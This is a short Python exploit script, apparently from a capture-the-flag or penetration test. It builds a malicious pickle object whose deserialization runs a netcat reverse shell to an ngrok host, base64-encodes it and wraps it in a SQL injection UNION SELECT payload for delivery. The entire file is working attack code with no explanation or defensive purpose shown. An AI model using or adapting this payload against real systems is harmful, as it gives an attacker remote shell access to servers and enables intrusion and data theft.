import sys
import base64
import pickle
import urllib.parse
import requests

class Payload:

  def __reduce__(self):
    import os
    cmd = ("mkfifo /tmp/p; nc 0.tcp.ap.ngrok.io 15792 0</tmp/p | /bin/sh > /tmp/p 2>&1; rm /tmp/p")
    return os.system, (cmd,)

if __name__ == "__main__":

  payload = base64.b64encode(pickle.dumps(Payload())).decode()

  payload = f"' UNION SELECT '{payload}' -- "

  payload = requests.utils.requote_uri(payload)

  print(payload)